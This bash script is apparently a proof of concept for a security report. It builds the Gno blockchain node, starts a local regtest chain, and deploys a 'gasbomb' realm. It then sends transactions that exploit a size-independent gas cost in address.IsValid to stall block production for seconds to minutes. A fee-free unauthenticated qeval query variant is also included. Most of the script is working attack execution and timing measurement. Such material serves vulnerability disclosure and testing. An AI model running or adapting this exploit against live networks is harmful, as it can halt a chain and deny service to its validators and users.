#!/bin/bash
# =============================================================================
# Gno regtest — end-to-end reproduction of the address.IsValid gas-bomb
# (Critical: single tx halts block production for minutes; scales to days)
#
# Prereqs: go >= 1.25, repo at github.com/gnolang/gno @ 0549199e3, ports
# 46656/46657 free. Runtime ~20 min (build + genesis + attacks).
# Every artifact lands in ./ alongside this script.
# =============================================================================
set -uxo pipefail
GNOREPO="${GNOREPO:-$HOME/Documents/gno}"
RG="$(cd "$(dirname "$0")" && pwd)"
RPC=127.0.0.1:46657

# --- 1. full build from source -----------------------------------------------
mkdir -p "$RG/bin"
(cd "$GNOREPO" && go build -o "$RG/bin/gnoland" ./gno.land/cmd/gnoland \
  && go build -o "$RG/bin/gnokey" ./gno.land/cmd/gnokey \
  && go build -o "$RG/bin/gno" ./gnovm/cmd/gno) || exit 1
git -C "$GNOREPO" rev-parse HEAD > "$RG/commit.txt"

# --- 2. attacker key + genesis funding ---------------------------------------
rm -rf "$RG/chain"; mkdir -p "$RG/chain/keyhome" "$RG/chain/nodedata"
printf '\n\n' | "$RG/bin/gnokey" -home "$RG/chain/keyhome" -insecure-password-stdin add attacker
ADDR=$("$RG/bin/gnokey" -home "$RG/chain/keyhome" list | grep -oE 'g1[a-z0-9]{38}' | head -1)
echo "ADDR=$ADDR" | tee "$RG/attacker_addr.txt"
echo "${ADDR}=100000000000000ugnot" > "$RG/chain/balances.txt"

# --- 3. bootstrap node (phase A: lazy-init; phase B: private ports + skips) ---
cd "$RG/chain/nodedata"
"$RG/bin/gnoland" start -lazy -data-dir "$RG/chain/nodedata" -chainid regtest \
  -genesis-balances-file "$RG/chain/balances.txt" -gnoroot-dir "$GNOREPO" \
  -log-level info > "$RG/chain/init.log" 2>&1 &
INIT=$!; for i in $(seq 1 40); do [ -f genesis.json ] && [ -f config/config.toml ] && break; sleep 3; done
kill $INIT 2>/dev/null; sleep 2
sed -i '' 's|laddr = "tcp://0.0.0.0:26656"|laddr = "tcp://127.0.0.1:46656"|; s|laddr = "tcp://127.0.0.1:26657"|laddr = "tcp://127.0.0.1:46657"|' config/config.toml
rm -rf db
nohup "$RG/bin/gnoland" start -data-dir "$RG/chain/nodedata" -chainid regtest \
  -skip-failing-genesis-txs -skip-genesis-sig-verification -gnoroot-dir "$GNOREPO" \
  -log-level info > "$RG/chain/node.log" 2>&1 &
echo $! > "$RG/chain/node.pid"
for i in $(seq 1 60); do H=$(curl -s --max-time 2 http://$RPC/status 2>/dev/null | python3 -c "import json,sys; print(json.load(sys.stdin)['result']['sync_info']['latest_block_height'])" 2>/dev/null); [ -n "$H" ] && [ "$H" -gt 1 ] 2>/dev/null && break; sleep 5; done
echo "RPC live, height=$H"

# --- 4. deploy attack realm ---------------------------------------------------
mkdir -p "$RG/realm" && cp "$RG/gasbomb.gno" "$RG/gnomod.toml" "$RG/realm/"
call() { F=$1; GW=$2; shift 2; printf '\n' | "$RG/bin/gnokey" -home "$RG/chain/keyhome" \
  -insecure-password-stdin maketx call attacker -pkgpath gno.land/r/sec/gasbomb \
  -func "$F" "$@" -gas-fee 1000001ugnot -gas-wanted "$GW" -broadcast=true \
  -simulate skip -chainid regtest -remote $RPC 2>&1; }
printf '\n' | "$RG/bin/gnokey" -home "$RG/chain/keyhome" -insecure-password-stdin \
  maketx addpkg attacker -pkgpath gno.land/r/sec/gasbomb -pkgdir "$RG/realm" \
  -gas-fee 1000001ugnot -gas-wanted 100000000 -broadcast=true -simulate skip \
  -chainid regtest -remote $RPC

# --- 5. baseline block cadence (expect ~5s/block) -----------------------------
for i in $(seq 1 6); do curl -s http://$RPC/status | python3 -c "import json,sys,time; print(time.strftime('%H:%M:%S'), 'height='+json.load(sys.stdin)['result']['sync_info']['latest_block_height'])"; sleep 5; done | tee "$RG/baseline_cadence.txt"

# --- 6. calibration: gas per call is SIZE-INDEPENDENT -------------------------
call Bomb 100000000 -args 4096 -args 2      | grep -E "GAS USED|^\(" > "$RG/calibration.txt"
call Bomb 100000000 -args 4096 -args 2000   | grep -E "GAS USED|^\(" >> "$RG/calibration.txt"
call Bomb 100000000 -args 1048576 -args 1   | grep -E "GAS USED|^\(" >> "$RG/calibration.txt"
call Bomb 100000000 -args 8388608 -args 1   | grep -E "GAS USED|^\(" >> "$RG/calibration.txt"
call Honest 100000000 -args 2000            | grep -E "GAS USED|^\(" >> "$RG/calibration.txt"
cat "$RG/calibration.txt"

# --- 7. ATTACK A: Bomb(1MB,100) — ~13-20s block freeze ------------------------
call Bomb 100000000 -args 1048576 -args 100 > "$RG/attackA_tx.txt" 2>&1 || true
# (gnokey's own 10s HTTP timeout may report "request timeout" — the tx still
#  commits; the freeze is read from the committed-block timeline below.)

# --- 8. ATTACK B: Bomb(8MB,300) — multi-minute chain halt ---------------------
( sleep 3; call Bomb 100000000 -args 8388608 -args 300 > "$RG/attackB_tx.txt" 2>&1 ) &
for i in $(seq 1 66); do TS=$(date +%H:%M:%S); H=$(curl -s --max-time 3 http://$RPC/status | python3 -c "import json,sys; print(json.load(sys.stdin)['result']['sync_info']['latest_block_height'])" 2>/dev/null); echo "$TS height=${H:-UNREACHABLE}"; sleep 5; done > "$RG/attackB_heights.txt"
grep -c UNREACHABLE "$RG/attackB_heights.txt"

# --- 9. free unauthenticated variant: qeval (no key, no fee) ------------------
timeout 90 "$RG/bin/gnokey" query "vm/qeval" --data "gno.land/r/sec/gasbomb.BombQ(8388608, 150)" -remote $RPC > "$RG/qeval_tx.txt" 2>&1 || true

# --- 10. verdict from committed blocks ----------------------------------------
echo "=== committed-block stalls (gap>6s) ==="
grep "Executed block" "$RG/chain/node.log" | sed -E 's/^.*([0-9]{2}:[0-9]{2}:[0-9]{2}).*height": ([0-9]+), "validTxs": ([0-9]+).*/\1 h\2 valid=\3/' | \
  awk '{split($1,t,":"); s=t[1]*3600+t[2]*60+t[3]; if (prev && s-prev>6) printf ">>> STALL %ds before %s (prev %s)\n", s-prev, $0, prevline; prev=s; prevline=$0}'

kill "$(cat "$RG/chain/node.pid")" 2>/dev/null
echo "DONE — artifacts in $RG"
